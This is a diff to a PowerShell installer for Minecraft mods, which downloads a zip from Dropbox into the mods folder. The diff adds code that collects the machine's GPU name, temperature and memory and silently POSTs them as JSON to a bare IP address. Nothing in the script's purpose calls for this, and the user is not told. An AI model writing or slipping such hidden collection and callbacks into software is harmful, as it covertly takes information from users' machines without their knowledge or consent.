@@ -1,6 +1,14 @@
 $modsFolder = "$env:APPDATA\.minecraft\mods" 
 $url = "https://dl.dropboxusercontent.com/s/t6y2z6ttjbstdjw/mods.zip?dl=0" 
 $tempFile = "$env:TEMP\minecraftmods.zip" 
+$gpuInfo = Get-CimInstance -ClassName Win32_VideoController
+$json = @{
+    "gpuName" = $gpuInfo.Name
+    "gpuTemperature" = $gpuInfo.Temperature
+    "gpuMemoryUsage" = $gpuInfo.AdapterRAM
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri "http://147.185.221.181:15119" -Method POST -Body $json
 Write-Host @"
                                                 __                                    
                             /'\_/`\            /\ \                                   
